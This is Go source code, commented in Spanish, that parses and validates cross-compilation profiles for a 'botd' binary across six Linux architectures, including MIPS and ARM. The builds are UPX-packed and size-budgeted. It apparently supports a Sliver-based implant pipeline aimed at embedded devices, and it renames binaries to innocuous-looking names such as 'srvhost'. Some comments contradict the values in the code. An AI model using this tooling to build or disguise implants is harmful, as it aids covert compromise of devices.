package main

import (
	"bufio"
	"fmt"
	"os"
	"regexp"
	"strconv"
	"strings"
)

// Profile es un perfil de compilacion de sliver-builder expandido por arch
// (BLUEPRINT §4: "compila botd por arquitectura"). El YAML de
// deploy/sliver-builder/profiles.yaml declara clases con listas de archs;
// aqui cada arch es un perfil. El parser cubre ese subconjunto exacto para
// no anadir dependencias (stdlib only).
type Profile struct {
	Name        string // "botd-<tag>" (nombre del binario en dist/)
	Class       string // A|B|C (nodes.device_class)
	GOOS        string
	GOARCH      string // arch Go: mips para mipsbe, mipsle para mipsle...
	GOARM       string // "none" si la arch no usa GOARM
	UPX         bool
	MaxBytes    int // presupuesto post-upx
	MaxBytesRaw int // presupuesto sin upx en el host de build
}

// archMatrix fija el orden canonico de la matriz y el mapeo tag->toolchain
// Go. Todo cambio aqui exige actualizar scripts/cross/build_matrix.sh y
// agent.ClassForArch (misma verdad de la matriz).
var archMatrix = []struct {
	Tag    string
	Class  string
	GOARCH string
	GOARM  string
}{
	{"amd64", "A", "amd64", "none"},
	{"arm64", "A", "arm64", "none"},
	{"armv5", "B", "arm", "5"},
	{"armv7", "B", "arm", "7"},
	{"mipsbe", "C", "mips", "none"},
	{"mipsle", "C", "mipsle", "none"},
}

// expectedBudget fija los topes por clase (BLUEPRINT §2; los mismos valores
// binarios que build-matrix.sh y profiles.yaml): A 4 MiB; B/C post-upx
// ~2,6 MiB. upx:true en las tres clases: el builder empaqueta siempre y la
// puerta es el tope estricto por clase, no la presencia de upx.
var expectedBudget = map[string]struct {
	rename   string
	upx      bool
	max, raw int
}{
	"A": {"botd", false, 8388608, 8388608},
	"B": {"flowd", true, 2726297, 4194304},
	"C": {"srvhost", true, 2726297, 4194304},
}

var classRe = regexp.MustCompile(`^([ABC]):$`)
var archListRe = regexp.MustCompile(`^archs:\s*\[(.*)\]$`)

// classState acumula las claves de una clase durante el parseo.
type classState struct {
	archs  []string
	rename string
	upx    bool
	max    int
	raw    int
	maxSet bool
	rawSet bool
	upxSet bool
	rnSet  bool
}

// LoadProfiles parsea profiles.yaml (subconjunto: front-matter `---`,
// comments `#`, bloque profiles: con clases A/B/C y claves planas) y
// expande cada arch declarado a un Profile.
func LoadProfiles(path string) ([]Profile, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	states := map[string]*classState{}
	var order []string
	inProfiles := false
	var cur *classState
	var curClass string

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := sc.Text()
		if i := strings.Index(line, "#"); i >= 0 {
			line = line[:i]
		}
		trimmed := strings.TrimSpace(line)
		if trimmed == "" || trimmed == "---" {
			continue
		}
		if trimmed == "profiles:" {
			inProfiles = true
			cur = nil
			continue
		}
		if !inProfiles {
			continue
		}
		if m := classRe.FindStringSubmatch(trimmed); m != nil {
			curClass = m[1]
			st := &classState{}
			states[curClass] = st
			order = append(order, curClass)
			cur = st
			continue
		}
		if cur == nil {
			continue
		}
		if m := archListRe.FindStringSubmatch(trimmed); m != nil {
			for _, a := range strings.Split(m[1], ",") {
				a = strings.TrimSpace(strings.Trim(a, `"`))
				if a != "" {
					cur.archs = append(cur.archs, a)
				}
			}
			continue
		}
		key, val, ok := strings.Cut(trimmed, ":")
		if !ok {
			return nil, fmt.Errorf("profiles %s: linea sin clave %q", path, trimmed)
		}
		val = strings.TrimSpace(val)
		switch strings.TrimSpace(key) {
		case "rename":
			if val == "" {
				return nil, fmt.Errorf("profiles %s: rename vacio", path)
			}
			cur.rename, cur.rnSet = val, true
		case "upx":
			b, err := strconv.ParseBool(val)
			if err != nil {
				return nil, fmt.Errorf("profiles %s: upx=%q", path, val)
			}
			cur.upx, cur.upxSet = b, true
		case "max_bytes":
			n, err := strconv.Atoi(val)
			if err != nil {
				return nil, fmt.Errorf("profiles %s: max_bytes=%q", path, val)
			}
			cur.max, cur.maxSet = n, true
		case "max_bytes_raw":
			n, err := strconv.Atoi(val)
			if err != nil {
				return nil, fmt.Errorf("profiles %s: max_bytes_raw=%q", path, val)
			}
			cur.raw, cur.rawSet = n, true
		default:
			return nil, fmt.Errorf("profiles %s: clave desconocida %q", path, key)
		}
	}
	if err := sc.Err(); err != nil {
		return nil, err
	}

	var out []Profile
	for _, class := range order {
		st := states[class]
		if !st.upxSet || !st.maxSet || !st.rawSet || !st.rnSet || len(st.archs) == 0 {
			return nil, fmt.Errorf("profiles %s: clase %s incompleta", path, class)
		}
		for _, tag := range st.archs {
			p, ok := profileForTag(class, tag, st)
			if !ok {
				return nil, fmt.Errorf("profiles %s: arch %q fuera de la matriz", path, tag)
			}
			out = append(out, p)
		}
	}
	return out, nil
}

func profileForTag(class, tag string, st *classState) (Profile, bool) {
	for _, m := range archMatrix {
		if m.Tag == tag && m.Class == class {
			return Profile{
				Name:        st.rename + "-" + tag,
				Class:       class,
				GOOS:        "linux",
				GOARCH:      m.GOARCH,
				GOARM:       m.GOARM,
				UPX:         st.upx,
				MaxBytes:    st.max,
				MaxBytesRaw: st.raw,
			}, true
		}
	}
	return Profile{}, false
}

// ValidateProfiles exige la matriz exacta de 6 archs con el presupuesto de
// su clase: perfil extra, ausente o tope alterado es fallo de build.
func ValidateProfiles(ps []Profile) error {
	if len(ps) != len(archMatrix) {
		return fmt.Errorf("perfiles: %d, want %d", len(ps), len(archMatrix))
	}
	for i, m := range archMatrix {
		bud := expectedBudget[m.Class]
		want := Profile{
			Name: bud.rename + "-" + m.Tag, Class: m.Class, GOOS: "linux",
			GOARCH: m.GOARCH, GOARM: m.GOARM,
			UPX: bud.upx, MaxBytes: bud.max, MaxBytesRaw: bud.raw,
		}
		if ps[i] != want {
			return fmt.Errorf("perfil #%d %s=%+v want %+v", i, m.Tag, ps[i], want)
		}
	}
	return nil
}
